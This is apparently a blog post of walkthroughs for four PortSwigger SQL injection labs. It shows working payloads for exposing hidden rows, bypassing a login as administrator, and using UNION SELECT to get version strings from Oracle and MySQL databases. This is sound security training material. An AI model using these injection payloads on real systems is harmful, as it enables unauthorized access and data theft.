---
title: Portswigger Labs
time: 2025-11-25 12:00:00
categories: [portswigger]
tags: [sqli]
image: 'assets/img/portswigger.png'
---

## SQLi (SQL Injection)

### Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
>  This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
> 
> Goal: Perform a SQL injection attack that causes the application to display one or more unreleased products.

#### Recon

The vulnerable parameter is the **category** value.
A simple test is to insert a **single quote `'`** after the category value and observe the application’s response.

When a quote is added, the application throws an error.
This suggests that the quote breaks the query's string syntax because it introduces an extra unmatched quote.

```sql
category = 'Gifts''
```

<img width="1389" height="493" alt="image" src="https://github.com/user-attachments/assets/177853a0-c050-4091-9a4a-3761c9694a34" />

However, if we add two quotes, the second quote becomes a new empty string, which is valid SQL:

```sql
category = 'Gifts' '' AND released = 1
```

<img width="1386" height="496" alt="image" src="https://github.com/user-attachments/assets/b2f0911e-5d73-4a3a-b57d-f6098a08f789" />

This confirms that the category parameter is vulnerable to SQL injection.

#### Exploitation

The page only displays **released** products because of this condition:

```sql
AND released = 1
```
To view unreleased products, we must remove the `AND released = 1` clause.

##### Comments in SQL

SQL supports inline comments and most SQL engines accept `--` to comment out the rest of the line.

Using this, we can terminate the string and comment out the `released = 1` check:

```sql
category = 'Lifestyle'' --' AND released = 1
```

<img width="1402" height="678" alt="image" src="https://github.com/user-attachments/assets/29e71df7-fd7c-4456-9117-66d0fe776894" />

This reveals **both released and unreleased** products from the *Lifestyle* category.

To retrieve all products from the table, we can use a boolean expression that is always true, such as `1=1`. 

This generates a query similar to:

```sql
SELECT * FROM products WHERE category = 'Lifestyle'' OR 1=1-- ' AND released = 1
```
Eventhough the category is invalid due to extra quote, the payload `OR 1=1` makes the query returns true hence retrieve all data.
<img width="1416" height="738" alt="image" src="https://github.com/user-attachments/assets/3d9658c8-6be1-470a-8ea1-4a0c2291bf68" />

### Lab 02: SQL injection vulnerability allowing login bypass
>  This lab contains a SQL injection vulnerability in the login function.
> 
> Goal: Perform a SQL injection attack that logs in to the application as the administrator user.

#### Recon
Since we didnt have the source code, we can assume that it will be a typical vulnerable login form like this
```sql
SELECT * FROM users 
WHERE username = '<USER_INPUT>' 
  AND password = '<USER_INPUT>';
```
Both the username and password fields are placed directly into the SQL query without proper sanitization. This means we can inject SQL syntax through the username field and bypass the password check entirely.

#### Exploitation
Since we know the username is `administrator`, we want to craft input that comments out the password check. We can use this payload:
```
administrator'-- 
```
SQL query will check only the username and ignore any password that we input.
```sql
SELECT * FROM users 
WHERE username = 'administrator'-- ' 
  AND password = 'test123';
```

#### Lab 03: SQL injection attack, querying the database type and version on Oracle

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
> Goal: Display the database version string. 

#### Recon
We start by testing the category parameter for SQL injection.

- A single quote `'` breaks the query → error.
- Double quotes `''` restore query syntax → confirms injectable field.
- Adding a SQL comment such as `--` makes the backend ignore the rest of the query.

This indicates that we can inject our own SQL in the category parameter.
  
#### Exploitation

To extract data from other tables than the original table in query, we need to use a UNION SELECT injection. But UNION queries must follow strict rules:

- Both SELECT statements must return the same number of columns.
- The data types of corresponding columns must be compatible.

Therefore, we must determine:

- How many columns are returned by the original query.
- Which data types we can inject.

A common way to check column count is:
```
' UNION SELECT null--
```
<img width="1396" height="745" alt="image" src="https://github.com/user-attachments/assets/bf687aaa-7611-499e-9656-4d683022914f" />

However, Oracle requires a FROM clause. To resolve this, we query from Oracle’s built-table which is `dual`:
```
' UNION SELECT null from dual--
```
<img width="1365" height="622" alt="image" src="https://github.com/user-attachments/assets/bc2794f9-23c2-42eb-8caf-bee8a418ae56" />

Still gives an error? It is likely column count mismatch.

Next, try two columns:
```
' UNION SELECT null, null from dual--
```
This time the page loads successfully, meaning the original query returns 2 columns.

<img width="1405" height="538" alt="image" src="https://github.com/user-attachments/assets/74d8cf0e-2f70-45e4-9fee-02a20fdff42f" />

We can query two columns from the table, but we must ensure the data types match the original query’s expected column types. If we try to inject a value with the wrong data type, Oracle will return an error. For example:
```
' UNION SELECT 'A', 1 FROM dual--
```
<img width="1347" height="490" alt="image" src="https://github.com/user-attachments/assets/a3971501-20b3-4920-93d4-b05415a4c2be" />

This results in an error because one of the columns expects a string, but we supplied an integer.

To verify the correct data types, we replace the integer with either a string or NULL. Since the following payload works without errors, we can conclude that both columns accept string data:
```
' UNION SELECT 'A', NULL FROM dual--
```

<img width="1393" height="543" alt="image" src="https://github.com/user-attachments/assets/8da1e8f9-bb0d-44ab-9be5-a206cbff2587" />


Since the description already states the DB is Oracle, we can use `v$version` table that stores version information.

The column we need is banner.
```
' UNION SELECT banner, null FROM v$version--
```

<img width="1401" height="651" alt="image" src="https://github.com/user-attachments/assets/2fc6b5a0-ee4b-47ec-8e43-d19f89367d76" />


### Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> 
> Goal: Display the database version string. 

#### Recon
Do the intial testing using quotes and comments. Upon testing, `--` double dash comment didnt work this time. According to <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Portswigger cheatsheat</a>, it is possible that database is MySQL which uses ` --` and `#` as comment.

<img width="1399" height="502" alt="image" src="https://github.com/user-attachments/assets/925fca20-1c46-4b73-ba9e-52370b9e0a6a" />

Do the same enumeration for column numbers and data types. Since this is not Oracle, you dont require to include FROM clause to check the column amounts.
```
' UNION SELECT null,null#
```

Same as previous lab, we have 2 columns. Both of columns will return string.
```
' UNION SELECT '1','2'#
```
<img width="1386" height="709" alt="image" src="https://github.com/user-attachments/assets/a2b4c0a7-8745-4da3-ba86-853c2a7a51cc" />

##### Exploitation
Now, we have all information that we need to craft the payload. We can use `@@version` to display database version for MySQL.
```
' UNION SELECT @@version,'2'#
```
<img width="1405" height="738" alt="image" src="https://github.com/user-attachments/assets/20bdc7c9-bd2a-4a36-83aa-8a5e282f0016" />
